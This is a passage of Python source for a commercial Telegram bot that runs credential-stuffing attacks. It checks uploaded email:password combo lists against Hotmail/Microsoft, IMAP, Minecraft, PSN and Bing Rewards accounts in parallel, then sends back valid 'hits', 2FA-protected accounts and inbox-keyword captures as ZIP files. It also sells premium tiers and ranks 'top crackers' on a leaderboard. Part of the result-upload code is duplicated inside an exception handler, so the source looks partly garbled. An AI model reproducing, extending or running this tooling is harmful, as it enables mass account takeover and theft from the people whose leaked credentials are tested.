                    with open(hits_file, 'rb') as f:
                        await context.bot.send_document(
                            chat_id=chat_id,
                            document=InputFile(f, filename="HITS.txt"),
                            caption=f"✨ *Valid Accounts* ({stats['hits']:,})"
                        )
                except Exception as e:
                    logger.error(f"Hits file upload error: {e}")
            
            # Send 2FA file separately
            twofa_file = os.path.join(results_path, "2fa.txt")
            if os.path.exists(twofa_file) and os.path.getsize(twofa_file) > 0:
                try:
                    with open(twofa_file, 'rb') as f:
                        await context.bot.send_document(
                            chat_id=chat_id,
                            document=InputFile(f, filename="2FA.txt"),
                            caption=f"🔐 *2FA Protected* ({stats['2fa']:,})"
                        )
                except Exception as e:
                    logger.error(f"2FA file upload error: {e}")
            
            # Update user stats
            self.key_manager.update_user_stats(user_id, len(unique_combos), stats['hits'])
            
            # Clean up session and stop stats tracking for /live
            self.user_sessions[user_id].pop("ki_keywords", None)
            self.user_sessions[user_id].pop("ki_combos", None)
            self.user_sessions[user_id].pop("ki_mode", None)
            self.user_sessions[user_id].pop("ki_step", None)
            
            if user_id in self.active_scans:
                scan_stats.stop()
                del self.active_scans[user_id]
            
        except Exception as e:
            logger.error(f"Keyword inbox scan error: {e}", exc_info=True)
            try:
                await context.bot.send_message(chat_id=chat_id,
                    text=f"❌ Scan error: {str(e)[:150]}")
            except:
                pass
            finally:
                # Cleanup stats even on error
                if user_id in self.active_scans:
                    try:
                        self.active_scans[user_id]['stats'].stop()
                    except:
                        pass
                    del self.active_scans[user_id]
            
            # Create report for export
            export = scanner.export_report()
            zip_path = export.get('zip_path')
            results_path = export.get('results_path')
            
            # Send ZIP file with all results organized
            if zip_path and os.path.exists(zip_path):
                try:
                    with open(zip_path, 'rb') as f:
                        await context.bot.send_document(
                            chat_id=chat_id,
                            document=InputFile(f, filename=os.path.basename(zip_path)),
                            caption="📦 *Complete Results Archive*\n\n"
                                   f"✨ Hits: {stats['hits']:,}\n"
                                   f"🔐 2FA: {stats['2fa']:,}\n"
                                   f"📋 By Keyword: {len(os.listdir(os.path.join(results_path, 'keywords')))} files\n"
                                   f"🌍 By Country: {len(os.listdir(os.path.join(results_path, 'countries')))} files",
                            parse_mode="Markdown"
                        )
                except Exception as e:
                    logger.error(f"ZIP upload error: {e}")
            
            # Send hits file separately with full data
            hits_file = os.path.join(results_path, "hits.txt")
            if os.path.exists(hits_file) and os.path.getsize(hits_file) > 0:
                try:
                    with open(hits_file, 'rb') as f:
                        await context.bot.send_document(
                            chat_id=chat_id,
                            document=InputFile(f, filename="HITS.txt"),
                            caption=f"✨ *Valid Accounts* ({stats['hits']:,})\n\n"
                                   f"Format: email:password | Inbox: X | Domain: Y | Country: Z\n"
                                   f"(Includes capture data for each hit)"
                        )
                except Exception as e:
                    logger.error(f"Hits file upload error: {e}")
            
            # Send 2FA file separately
            twofa_file = os.path.join(results_path, "2fa.txt")
            if os.path.exists(twofa_file) and os.path.getsize(twofa_file) > 0:
                try:
                    with open(twofa_file, 'rb') as f:
                        await context.bot.send_document(
                            chat_id=chat_id,
                            document=InputFile(f, filename="2FA.txt"),
                            caption=f"🔐 *2FA Protected* ({stats['2fa']:,})"
                        )
                except Exception as e:
                    logger.error(f"2FA file upload error: {e}")
            
            # Update user stats
            self.key_manager.update_user_stats(user_id, len(unique_combos), stats['hits'])
            
            # Clean up session and stop stats tracking for /live
            self.user_sessions[user_id].pop("ki_keywords", None)
            self.user_sessions[user_id].pop("ki_combos", None)
            self.user_sessions[user_id].pop("ki_mode", None)
            self.user_sessions[user_id].pop("ki_step", None)
            
            if user_id in self.active_scans:
                scan_stats.stop()
                del self.active_scans[user_id]
            
        except Exception as e:
            logger.error(f"Keyword inbox scan error: {e}", exc_info=True)
            try:
                await context.bot.send_message(chat_id=chat_id,
                    text=f"❌ Scan error: {str(e)[:150]}")
            except:
                pass
            finally:
                # Cleanup stats even on error
                if user_id in self.active_scans:
                    try:
                        self.active_scans[user_id]['stats'].stop()
                    except:
                        pass
                    del self.active_scans[user_id]
    
    async def _update_ki_progress(self, chat_id: int, msg_id: int, context, checked: int, total: int, results: dict, start_time: float):
        """Update progress display during scan"""
        try:
            elapsed = time.time() - start_time
            cpm = (checked / elapsed * 60) if elapsed > 0 else 0
            progress_pct = (checked / total * 100) if total > 0 else 0
            
            progress_text = (
                f"⏳ *Keyword Inbox Scan In Progress*\n\n"
                f"📊 Checked: {checked:,} / {total:,} ({progress_pct:.1f}%)\n"
                f"✨ Hits: {results['hits']:,}\n"
                f"🔐 2FA: {results['2fa']:,}\n"
                f"❌ Bad: {results['bad']:,}\n"
                f"⚠️ Errors: {results['errors']:,}\n\n"
                f"⏱️ Time: {int(elapsed)}s | 🚀 CPM: {cpm:.1f}"
            )
            
            await context.bot.edit_message_text(chat_id=chat_id, message_id=msg_id,
                text=progress_text, parse_mode="Markdown")
        except Exception as e:
            logger.debug(f"Progress update error: {e}")

    async def _start_full_scan(self, user_id: int, combos: List[str], threads: int, context: ContextTypes.DEFAULT_TYPE):
        """Run ALL crackers ONE BY ONE with dedicated full scan stats"""
        try:
            unique_combos, removed_count = remove_duplicates(combos)
            if removed_count > 0:
                await context.bot.send_message(chat_id=self.user_sessions[user_id].get("chat_id", user_id), text=f"🔄 Duplicate remover: Removed {removed_count} duplicate combos. {len(unique_combos)} unique combos remaining.")
            
            tier = self._get_user_tier(user_id)
            is_premium = self.key_manager.is_premium(user_id)
            limit = PREMIUM_TIERS[tier]["daily_limit"]
            max_threads = PREMIUM_TIERS[tier]["max_threads"]
            threads = min(threads, max_threads)
            
            # Check daily limits for FREE users
            if not is_premium:
                daily_used = self.key_manager.get_daily_used(user_id)
                free_lines = self.key_manager.get_free_lines_available(user_id)
                effective_limit = limit + free_lines
                
                if daily_used + len(unique_combos) > effective_limit:
                    await context.bot.send_message(chat_id=self.user_sessions[user_id].get("chat_id", user_id), text=f"❌ Daily limit reached ({limit} lines). You have {free_lines:,} bonus lines. Upgrade to premium.")
                    return
                
                success, lines_from_free, lines_from_daily = self.key_manager.add_daily_used_with_free_lines(user_id, len(unique_combos))
                if not success:
                    await context.bot.send_message(chat_id=self.user_sessions[user_id].get("chat_id", user_id), text="❌ Daily limit exceeded.")
                    return
            
            chat_id = self.user_sessions.get(user_id, {}).get("chat_id")
            if not chat_id:
                return
            
            # ========== FULL SCAN DEDICATED STATS ==========
            scan_start_time = time.time()
            full_scan_stats = {
                'total_combos': len(unique_combos),
                'current_cracker': '',
                'active_crackers': set(),  # Track multiple concurrent crackers
                'start_time': scan_start_time,
                'brute': {'checked': 0, 'hits': 0},
                'mc': {'checked': 0, 'hits': 0},
                'psn': {'checked': 0, 'hits': 0},
                'rewards': {'checked': 0, 'hits': 0},
                'imap': {'checked': 0, 'hits': 0},
                'hotmail': {'checked': 0, 'hits': 0},
            }
            
            cracker_results = {
                'brute': [],
                'mc': [],
                'psn': [],
                'rewards': [],
                'imap': [],
                'hotmail': [],
            }
            
            # Use a mutable container so nested function can update the message reference
            msg_container = {'status_msg': None}
            stop_event = Event()
            self.active_scans[user_id] = {'stop_event': stop_event, 'stats': full_scan_stats, 'msg_info': msg_container}
            
            async def update_full_scan_display():
                """Update the full scan stats display with detailed CPM and stats"""
                try:
                    active = full_scan_stats['active_crackers']
                    
                    # Calculate totals and speeds
                    total_checked = sum(full_scan_stats[c]['checked'] for c in ['brute', 'mc', 'psn', 'rewards', 'imap', 'hotmail'])
                    total_hits = sum(full_scan_stats[c]['hits'] for c in ['brute', 'mc', 'psn', 'rewards', 'imap', 'hotmail'])
                    elapsed_seconds = time.time() - full_scan_stats['start_time']
                    elapsed_minutes = elapsed_seconds / 60
                    elapsed_hours = elapsed_minutes / 60
                    
                    # Calculate speeds
                    cps = total_checked / elapsed_seconds if elapsed_seconds > 0 else 0  # Checks per second
                    cpm = int(cps * 60)  # Checks per minute
                    cph = int(cps * 3600)  # Checks per hour
                    remaining_combos = full_scan_stats['total_combos'] - total_checked
                    eta_seconds = remaining_combos / cps if cps > 0 else 0
                    
                    # Hit rate percentage
                    hit_rate = (total_hits / total_checked * 100) if total_checked > 0 else 0
                    
                    # Speed gauge emoji representation
                    if cpm >= 1000:
                        speed_gauge = "🔥🔥🔥🔥🔥"
                    elif cpm >= 500:
                        speed_gauge = "🔥🔥🔥🔥"
                    elif cpm >= 200:
                        speed_gauge = "🔥🔥🔥"
                    elif cpm >= 100:
                        speed_gauge = "🔥🔥"
                    elif cpm > 0:
                        speed_gauge = "🔥"
                    else:
                        speed_gauge = "❄️"
                    
                    # Format elapsed time
                    mins, secs = divmod(int(elapsed_seconds), 60)
                    hours, mins = divmod(mins, 60)
                    if hours > 0:
                        elapsed_str = f"{hours}h {mins}m {secs}s"
                    else:
                        elapsed_str = f"{mins}m {secs}s"
                    
                    # Format ETA
                    eta_mins, eta_secs = divmod(int(eta_seconds), 60)
                    eta_hours, eta_mins = divmod(eta_mins, 60)
                    if eta_hours > 0:
                        eta_str = f"{eta_hours}h {eta_mins}m"
                    else:
                        eta_str = f"{eta_mins}m {eta_secs}s"
                    
                    # Progress bar
                    progress = (total_checked / full_scan_stats['total_combos'] * 100) if full_scan_stats['total_combos'] > 0 else 0
                    bar_filled = int(progress / 10)
                    progress_bar = "█" * bar_filled + "░" * (10 - bar_filled)
                    
                    # Show active crackers
                    active_str = " + ".join([c.upper() for c in sorted(active)]) if active else "⏸️ Finalizing..."
                    
                    # Build impressive display with CPM as main focus
                    text = f"╔═══════════════════════════════════════╗\n"
                    text += f"║  🚀 **FULL SCAN PRO** - PARALLEL MODE  ║\n"
                    text += f"╚═══════════════════════════════════════╝\n\n"
                    
                    # CPM MAIN DISPLAY - HUGE AND BOLD
                    text += f"⚡ **CPM: {cpm:,} CHECKS/MIN** {speed_gauge}\n"
                    text += f"   └─ {cps:.1f} checks/sec | {cph:,} checks/hour\n\n"
                    
                    # Scan progress
                    text += f"📊 **SCAN PROGRESS**\n"
                    text += f"├─ Total: {full_scan_stats['total_combos']:,} combos\n"
                    text += f"├─ Checked: {total_checked:,} ({progress:.1f}%)\n"
                    text += f"├─ Hits: {total_hits} 🎯 | Hit Rate: {hit_rate:.2f}%\n"
                    text += f"└─ [{progress_bar}]\n\n"
                    
                    # Time info
                    text += f"⏱️ **TIME INFO**\n"
                    text += f"├─ Elapsed: {elapsed_str}\n"
                    text += f"├─ Remaining: {remaining_combos:,} combos\n"
                    text += f"└─ ETA: {eta_str}\n\n"
                    
                    # Active crackers with emphasis
                    text += f"🔄 **ACTIVE NOW**: {active_str}\n"
                    text += f"   Threads: {len(active)} running in parallel\n\n"
                    
                    # Per-cracker performance
                    text += f"{'╔' + '═'*37 + '╗'}\n"
                    text += f"║ **CRACKER PERFORMANCE**               ║\n"
                    text += f"{'╠' + '═'*37 + '╣'}\n"
                    
                    for cracker_name in ['brute', 'mc', 'psn', 'rewards', 'imap', 'hotmail']:
                        stats = full_scan_stats[cracker_name]
                        checked = stats['checked']
                        hits = stats['hits']
                        
                        # Individual CPM
                        if elapsed_seconds > 0 and checked > 0:
                            ind_cps = checked / elapsed_seconds
                            ind_cpm = int(ind_cps * 60)
                        else:
                            ind_cpm = 0
                        
                        # Status indicator
                        if cracker_name in active:
                            status = "▶️"
                        elif hits > 0:
                            status = "✅"
                        elif checked > 0:
                            status = "⏹️"
                        else:
                            status = "⏸️"
                        
                        hit_str = f"({hits}🎯)" if hits > 0 else "(0)"
                        text += f"║{status} {cracker_name.upper():8} │ {ind_cpm:>5,}cpm │ {hit_str:<4} {checked:>5}c║\n"
                    
                    text += f"{'╚' + '═'*37 + '╝'}\n"
                    
                    # Create keyboard with refresh button
                    keyboard = [[InlineKeyboardButton("🔄 REFRESH", callback_data=f"fullscan_refresh_{user_id}")]]
                    reply_markup = InlineKeyboardMarkup(keyboard)
                    
                    if msg_container['status_msg']:
                        try:
                            await context.bot.edit_message_text(
                                chat_id=chat_id,
                                message_id=msg_container['status_msg'].message_id,
                                text=text,
                                parse_mode=ParseMode.MARKDOWN,
                                reply_markup=reply_markup
                            )
                        except Exception as e:
                            logger.debug(f"Edit failed: {e}. Resending message...")
                            msg_container['status_msg'] = await context.bot.send_message(chat_id=chat_id, text=text, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
                    else:
                        msg_container['status_msg'] = await context.bot.send_message(chat_id=chat_id, text=text, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
                except Exception as e:
                    logger.debug(f"Stats update error: {e}")
            
            # Initial display
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"🚀 **FULL SCAN STARTING**\n\nRunning in PARALLEL GROUPS:\n• Group 1: ⚡ Brute + ⛏️ Minecraft\n• Group 2: 🎮 PSN + 💎 Rewards\n• Group 3: 📧 IMAP + 🔥 Hotmail\n\n⏳ Initializing...",
                parse_mode=ParseMode.MARKDOWN
            )
            
            # ========== PARALLEL CRACKER EXECUTION (2-3 at a time) ==========
            async def run_brute_cracker():
                """Run brute force cracker"""
                full_scan_stats['active_crackers'].add('brute')
                await update_full_scan_display()
                try:
                    for combo in unique_combos:
                        if stop_event.is_set():
                            break
                        try:
                            email, pwd = combo.split(':', 1)
                            full_scan_stats['brute']['checked'] += 1
                            result = self.scanner_engine.check_single(email, pwd.strip(), [])
                            if result.get('status') == 'HIT':
                                full_scan_stats['brute']['hits'] += 1
                                cracker_results['brute'].append(combo)
                        except:
                            pass
                        if full_scan_stats['brute']['checked'] % 20 == 0:
                            await update_full_scan_display()
                except Exception as e:
                    logger.error(f"Brute cracker error: {e}")
                finally:
                    full_scan_stats['active_crackers'].discard('brute')
                await update_full_scan_display()
            
            async def run_mc_cracker():
                """Run Minecraft cracker"""
                full_scan_stats['active_crackers'].add('mc')
                await update_full_scan_display()
                try:
                    mc_lines = unique_combos[:5000]
                    for combo in mc_lines:
                        if stop_event.is_set():
                            break
                        try:
                            email, pwd = combo.split(':', 1)
                            full_scan_stats['mc']['checked'] += 1
                            result = self.scanner_engine.check_mc_single(email, pwd.strip())
                            if result and result.get('valid'):
                                full_scan_stats['mc']['hits'] += 1
                                cracker_results['mc'].append(combo)
                        except:
                            pass
                        if full_scan_stats['mc']['checked'] % 20 == 0:
                            await update_full_scan_display()
                except Exception as e:
                    logger.error(f"MC cracker error: {e}")
                finally:
                    full_scan_stats['active_crackers'].discard('mc')
                await update_full_scan_display()
            
            async def run_psn_cracker():
                """Run PSN cracker"""
                full_scan_stats['active_crackers'].add('psn')
                await update_full_scan_display()
                try:
                    for combo in unique_combos:
                        if stop_event.is_set():
                            break
                        try:
                            email, pwd = combo.split(':', 1)
                            full_scan_stats['psn']['checked'] += 1
                            result = self.psn_engine.check_single(email, pwd.strip()) if hasattr(self, 'psn_engine') else {}
                            if result and result.get('status') in ['HIT', 'FREE']:
                                full_scan_stats['psn']['hits'] += 1
                                cracker_results['psn'].append(combo)
                        except:
                            pass
                        if full_scan_stats['psn']['checked'] % 20 == 0:
                            await update_full_scan_display()
                except Exception as e:
                    logger.error(f"PSN cracker error: {e}")
                finally:
                    full_scan_stats['active_crackers'].discard('psn')
                await update_full_scan_display()
            
            async def run_rewards_cracker():
                """Run Rewards cracker"""
                full_scan_stats['active_crackers'].add('rewards')
                await update_full_scan_display()
                try:
                    for combo in unique_combos:
                        if stop_event.is_set():
                            break
                        try:
                            email, pwd = combo.split(':', 1)
                            full_scan_stats['rewards']['checked'] += 1
                            result = self.rewards_engine.check_single(email, pwd.strip()) if hasattr(self, 'rewards_engine') else {}
                            if result and result.get('status') == 'HIT':
                                full_scan_stats['rewards']['hits'] += 1
                                cracker_results['rewards'].append(combo)
                        except:
                            pass
                        if full_scan_stats['rewards']['checked'] % 20 == 0:
                            await update_full_scan_display()
                except Exception as e:
                    logger.error(f"Rewards cracker error: {e}")
                finally:
                    full_scan_stats['active_crackers'].discard('rewards')
                await update_full_scan_display()
            
            async def run_imap_cracker():
                """Run IMAP cracker"""
                full_scan_stats['active_crackers'].add('imap')
                await update_full_scan_display()
                try:
                    for combo in unique_combos:
                        if stop_event.is_set():
                            break
                        try:
                            email, pwd = combo.split(':', 1)
                            full_scan_stats['imap']['checked'] += 1
                            result = self.scanner_engine.check_imap(email, pwd.strip())
                            if result and result.get('valid'):
                                full_scan_stats['imap']['hits'] += 1
                                cracker_results['imap'].append(combo)
                        except:
                            pass
                        if full_scan_stats['imap']['checked'] % 20 == 0:
                            await update_full_scan_display()
                except Exception as e:
                    logger.error(f"IMAP cracker error: {e}")
                finally:
                    full_scan_stats['active_crackers'].discard('imap')
                await update_full_scan_display()
            
            async def run_hotmail_cracker():
                """Run Hotmail cracker"""
                full_scan_stats['active_crackers'].add('hotmail')
                await update_full_scan_display()
                try:
                    for combo in unique_combos:
                        if stop_event.is_set():
                            break
                        try:
                            email, pwd = combo.split(':', 1)
                            full_scan_stats['hotmail']['checked'] += 1
                            result = self.brute_root.check_single(email, pwd.strip()) if hasattr(self, 'brute_root') else {}
                            if result and result.get('status') == 'HIT':
                                full_scan_stats['hotmail']['hits'] += 1
                                cracker_results['hotmail'].append(combo)
                        except:
                            pass
                        if full_scan_stats['hotmail']['checked'] % 20 == 0:
                            await update_full_scan_display()
                except Exception as e:
                    logger.error(f"Hotmail cracker error: {e}")
                finally:
                    full_scan_stats['active_crackers'].discard('hotmail')
                await update_full_scan_display()
            
            # ========== EXECUTE IN PARALLEL GROUPS ==========
            try:
                # GROUP 1: BRUTE + MC (parallel)
                if not stop_event.is_set():
                    await asyncio.gather(run_brute_cracker(), run_mc_cracker())
                
                # GROUP 2: PSN + REWARDS (parallel)
                if not stop_event.is_set():
                    await asyncio.gather(run_psn_cracker(), run_rewards_cracker())
                
                # GROUP 3: IMAP + HOTMAIL (parallel)
                if not stop_event.is_set():
                    await asyncio.gather(run_imap_cracker(), run_hotmail_cracker())
            
            except Exception as e:
                logger.error(f"Parallel execution error: {e}")
            
            # ========== COMPILE RESULTS INTO ZIP ==========
            full_scan_stats['current_cracker'] = 'COMPILING'
            await update_full_scan_display()
            
            zip_path = os.path.join(tempfile.gettempdir(), f"fullscan_all_{user_id}_{int(time.time())}.zip")
            try:
                with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                    # Add each cracker's results
                    for cracker_name, results in cracker_results.items():
                        if results:
                            content = '\n'.join(results)
                            zf.writestr(f"{cracker_name}_hits.txt", content.encode('utf-8'))
                    
                    # Add summary file
                    summary_file = "FULL_SCAN_SUMMARY.txt"
                    summary_content = f"""FULL SCAN RESULTS - ALL IN ONE
================================
Total Combos: {full_scan_stats['total_combos']:,}

RESULTS BY CRACKER:
"""
                    total_all_hits = 0
                    for cracker_name, stats in full_scan_stats.items():
                        if cracker_name not in ['total_combos', 'current_cracker'] and isinstance(stats, dict):
                            hits = stats.get('hits', 0)
                            total_all_hits += hits
                            summary_content += f"\n{cracker_name.upper()}: {hits} hits"
                    
                    summary_content += f"\n\nTOTAL HITS (ALL CRACKERS): {total_all_hits}\n"
                    zf.writestr(summary_file, summary_content.encode('utf-8'))
                
                # ========== SEND FINAL RESULTS ==========
                total_hits = sum(len(v) for v in cracker_results.values())
                final_summary = f"""🚀 **FULL SCAN COMPLETE!**

📊 **RESULTS:**
```
Total Combos:    {full_scan_stats['total_combos']:,}
Total Hits:      {total_hits}

🔨 Brute Force:  {full_scan_stats['brute']['hits']} hits
⛏️  Minecraft:    {full_scan_stats['mc']['hits']} hits
🎮 PSN:          {full_scan_stats['psn']['hits']} hits
💎 Rewards:      {full_scan_stats['rewards']['hits']} hits
📧 IMAP:         {full_scan_stats['imap']['hits']} hits
🔥 Hotmail:      {full_scan_stats['hotmail']['hits']} hits
```

📁 **All results in organized ZIP file!**"""
                
                with open(zip_path, 'rb') as f:
                    await context.bot.send_document(
                        chat_id=chat_id,
                        document=InputFile(f, filename='FULL_SCAN_RESULTS.zip'),
                        caption=final_summary,
                        parse_mode=ParseMode.MARKDOWN
                    )
                
                try:
                    os.remove(zip_path)
                except:
                    pass
                
            except Exception as e:
                logger.error(f"ZIP creation error: {e}")
                await context.bot.send_message(chat_id=chat_id, text=f"❌ Error creating ZIP: {str(e)}")
            
            # Update user stats
            total_hits = sum(len(v) for v in cracker_results.values())
            self.key_manager.update_user_stats(user_id, len(unique_combos), total_hits)
            
            # Cleanup
            if user_id in self.active_scans:
                del self.active_scans[user_id]
            
        except Exception as e:
            logger.error(f"Full scan error: {e}")

    # ==================== PAYMENT HANDLERS ====================
    async def _handle_buy_selection(self, query, data: str, user_id: int):
        plan = data.replace("buy_", "")
        if plan == "free":
            await query.edit_message_text("✅ **FREE Plan Active**\n\nYou already have the FREE plan. Upgrade to premium for higher limits.\n\nUse /buy to see premium plans.", parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cmd_buy")]]))
            return
        tier_map = {"three_days": "three_days", "weekly": "weekly", "monthly": "monthly", "three_months": "three_months"}
        if plan not in tier_map:
            await query.answer("Invalid plan!", show_alert=True)
            return
        tier = tier_map[plan]
        if tier not in PREMIUM_TIERS:
            await query.answer("Plan not available!", show_alert=True)
            return
        tier_info = PREMIUM_TIERS[tier]
        payment_id = f"PAY_{user_id}_{int(time.time())}_{plan}"
        self.pending_payments[payment_id] = {"user_id": user_id, "plan": tier, "amount": tier_info["price"], "days": tier_info["duration"], "timestamp": datetime.now()}
        text = f"💎 **Purchase {tier_info['name']} Membership**\n\n💰 Price: **${tier_info['price']} USD**\n⏱️ Duration: **{tier_info['duration']} Days**\n🆔 Payment ID: `{payment_id}`\n\n{tier_info['description']}\n\n📋 **How to complete your purchase:**\n\n1️⃣ Send the payment to @NoMan8x8\n2️⃣ Include Payment ID: `{payment_id}`\n3️⃣ Receive your premium key instantly!\n\n⚡ Average delivery time: 5-10 minutes"
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("💬 Contact @NoMan8x8", url="https://t.me/NoMan8x8")], [InlineKeyboardButton("🔙 Back to Pricing", callback_data="cmd_buy")]])
        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=keyboard)

    async def _show_buy_menu(self, query):
        await query.edit_message_text("💎 **Purchase Premium Access**\n\nSelect your preferred plan:\n\n💎 **FREE** - 5k lines/day, 100 threads, 3 services\n💎 **WEEKLY** - $8 / 300 TL\n💎 **MONTHLY** - $12 / 500 TL\n💎 **YEARLY** - $100 / 4400 TL\n\nClick a plan below to proceed:", parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_buy_keyboard())

    async def pre_checkout_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.pre_checkout_query.answer(ok=True)

    async def successful_payment_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text("✅ **Payment Received!**\n\nYour premium key will be sent to you shortly.\nContact @NoMan8x8 if you don't receive it within 10 minutes.", parse_mode=ParseMode.MARKDOWN)

    # ==================== MENU DISPLAYS ====================
    async def _send_welcome_message(self, chat_id: int, user, context: ContextTypes.DEFAULT_TYPE):
        is_premium = self.key_manager.is_premium(user.id)
        user_stats = self.key_manager.get_user_stats(user.id)
        total_users = len(self.key_manager.get_all_users())
        global_data = self.key_manager.get_global_stats()
        uptime = global_stats.get_uptime()
        live_data = global_stats.get_stats()
        
        # Count actual active scans from both regular and premium
        actual_active_scans = len(self.active_scans) + len(self.active_premium_scans)
        
        status_emoji = "🟢" if is_premium else "⚪"
        has_active = user.id in self.active_scans
        tier = self._get_user_tier(user.id)
        tier_name = PREMIUM_TIERS[tier]["name"]
        welcome_text = f"**🔥 Hotmail Master Bot v7.7** {status_emoji}\n\n👋 Welcome, {user.first_name}!\nYour all-in-one Microsoft account checker\n\n**🏥 Bot Health Status:**\n```\nSystem Status:    ONLINE ✅\nBot Uptime:       {uptime}\nTotal Users:      {total_users}\nGlobal Checked:   {global_data['total_checked']}\nGlobal Hits:      {global_data['total_hits']}\nActive Scans:     {actual_active_scans}\n```\n\n**🔥 Available Features:**\n• 📧 Custom Inbox Keyword Search\n• 📋 My Selected Services (ZIP!)\n• ⚡ High-Speed Brute Validation\n• ⛏️ Minecraft Full Capture\n• 💎 Bing Rewards Points Checker\n• 🎮 PSN Account Data\n• 🍿 Crunchyroll Subscription (REQUIRES PROXY)\n• 📧 IMAP Checker (fast validation)\n• 📧 IMAP Inboxer (multi-keyword search)\n• 🔥 Hotmail Bruter\n• 🌍 Country Cracker (filter by country)\n• 📊 **LIVE REAL-TIME STATS**\n\n**📁 ZIP Results Format:**\n`service_domain_at_provider_com.txt`\nExample: `playstation_com.txt`\n\n**👤 Your Plan:** {tier_name}\n**Your Stats:** Checked: {user_stats.get('total_checked', 0)} | Hits: {user_stats.get('total_hits', 0)}\n\n**💰 Pricing:**\n• FREE: 5k lines/day, 100 threads, 3 services\n• WEEKLY: $8 – 15k lines, 150 threads\n• MONTHLY: $12 – Unlimited, 200 threads\n• YEARLY: $100 – Unlimited, 250 threads\n\n**👨‍💻 Dev:** @NoMan8x8\nSelect an option below:"
        if has_active:
            welcome_text += "\n\n⚠️ You have an active scan! Use /live to view stats."
        try:
            await context.bot.send_message(chat_id=chat_id, text=welcome_text, parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_main_keyboard(user.id))
        except Exception as e:
            logger.error(f"Error sending welcome: {e}")

    def _get_user_tier(self, user_id: int) -> str:
        if self.key_manager.is_premium(user_id):
            expiry = self.key_manager.get_premium_expiry(user_id)
            if expiry:
                days_left = (expiry - datetime.now()).days
                if days_left >= 90:
                    return "three_months"
                elif days_left >= 30:
                    return "monthly"
                elif days_left >= 7:
                    return "weekly"
                elif days_left >= 3:
                    return "three_days"
        return "free"

    async def _show_leaderboards(self, query):
        """Show leaderboards of top crackers with premium styling"""
        try:
            text = "🏆 **TOP CRACKERS LEADERBOARD**\n"
            text += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            
            leaderboard = self.key_manager.get_leaderboard(limit=10)
            
            if not leaderboard:
                text = "📭 **No crackers yet!**\n\nStart scanning to join the leaderboard! 🚀"
                await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN,
                                             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="menu_main")]]))
                return
            
            medals = ["🥇", "🥈", "🥉", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"]
            
            for idx, (user_id_str, user_data, total_hits) in enumerate(leaderboard):
                medal = medals[idx] if idx < len(medals) else f"{idx+1}."
                username = user_data.get('username', f'User {user_id_str}')
                username_safe = username.replace('_', '\\_').replace('*', '\\*').replace('[', '\\[').replace(']', '\\]')
                
                # Get premium status
                is_premium = "💎" if self.key_manager.is_premium(int(user_id_str)) else ""
                
                text += f"{medal} **{username_safe}** {is_premium}\n"
                text += f"   🎯 Hits: `{total_hits:,}`\n"
                text += f"   🔗 Rank: `#{idx+1}`\n\n"
            
            text += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            text += "💪 Keep cracking to climb the leaderboard!"
            
            await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN,
                                         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Refresh", callback_data="menu_leaderboards")],
                                                                            [InlineKeyboardButton("🔙 Back", callback_data="menu_main")]]))
        except Exception as e:
            logger.error(f"Error in _show_leaderboards: {e}")
            try:
                await query.answer("❌ Error loading leaderboards", show_alert=True)
            except:
                pass

    async def _show_premium_scans(self, query, context: ContextTypes.DEFAULT_TYPE):
        """Show all active premium scans - similar to current scans"""
        try:
            text = "💎 **ACTIVE PREMIUM SCANS**\n\n"
            
            if not self.active_premium_scans:
                text += "✅ No active premium scans at the moment"
                try:
                    await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, 
                                                 reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="menu_main")]]))
                except Exception as e:
                    logger.warning(f"Error in _show_premium_scans (empty): {e}")
                    try:
                        await query.answer("No active premium scans", show_alert=False)
                    except:
                        pass
                return
            
            text += f"🟢 **Premium Scans: {len(self.active_premium_scans)}**\n\n"
            
            for uid, scan_info in list(self.active_premium_scans.items())[:10]:
                try:
                    stats = scan_info.get('stats')
                    if stats:
                        snap = stats.get_snapshot()
                        user_data = self.key_manager.users.get(str(uid), {})
                        username = user_data.get('username', f'User {uid}')
                        username_safe = username.replace('_', '\\_').replace('*', '\\*').replace('[', '\\[').replace(']', '\\]').replace('`', '\\`')
                        text += f"👤 **{username_safe}** (Premium)\n"
                        text += f"  ✅ Checked: `{snap['checked']:,}` / `{snap['total']:,}`\n"
                        text += f"  🎯 Hits: `{snap['hits']}`\n"
                        text += f"  ⚡ Speed: `{snap['cpm']}` CPM\n\n"
                except Exception as e:
                    logger.error(f"Error processing premium scan {uid}: {e}")
                    continue
            
            if len(self.active_premium_scans) > 10:
                text += f"... and {len(self.active_premium_scans) - 10} more premium scans\n"
            
            try:
                await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN,
                                             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Refresh", callback_data="menu_premium_scans")],
                                                                                [InlineKeyboardButton("🔙 Back", callback_data="menu_main")]]))
            except Exception as e:
                logger.warning(f"Error editing in _show_premium_scans: {e}")
                try:
                    text_safe = text[:4000] if len(text) > 4000 else text
                    await context.bot.send_message(chat_id=query.message.chat_id, text=text_safe, parse_mode=ParseMode.MARKDOWN)
                except Exception as e2:
                    logger.error(f"Fallback failed in _show_premium_scans: {e2}")
                    try:
                        await query.answer("⚠️ Error loading premium scans", show_alert=True)
                    except:
                        pass
        except Exception as e:
            logger.error(f"Critical error in _show_premium_scans: {e}")
            try:
                await query.answer("❌ System error", show_alert=True)
